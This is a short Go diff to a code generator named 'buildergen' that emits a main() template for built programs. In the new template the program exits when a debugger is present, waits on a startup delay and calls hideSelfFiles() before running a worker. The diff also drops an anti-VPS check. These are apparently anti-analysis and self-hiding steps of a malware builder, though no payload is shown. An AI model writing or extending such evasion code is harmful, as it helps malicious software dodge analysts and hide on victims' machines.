@@ -1,28 +1,15 @@
 package buildergen
 
-import (
-	"fmt"
-	"strings"
-)
+import "strings"
 
-func templateMainFlow(cfg Config) string {
-	delay := cfg.StartupDelaySeconds
-	if delay < 0 {
-		delay = 0
-	}
-	if delay > 10 {
-		delay = 10
-	}
-
-	return strings.TrimSpace(fmt.Sprintf(`
+func templateMainFlow() string {
+	return strings.TrimSpace(`
 func main() {
-	if ensureSingleRunPerBuild() && shouldEnforceBuildLock() {
+	if isDebuggerPresent() {
 		os.Exit(0)
 	}
 
-	checkAntiVps()
-
-	applyStartupDelay(%d)
+	applyStartupDelay()
 
 	hideSelfFiles()
 
@@ -67,5 +54,5 @@ func main() {
 
 	runPrimaryWithWorker()
 }
-`, delay))
+`)
 }
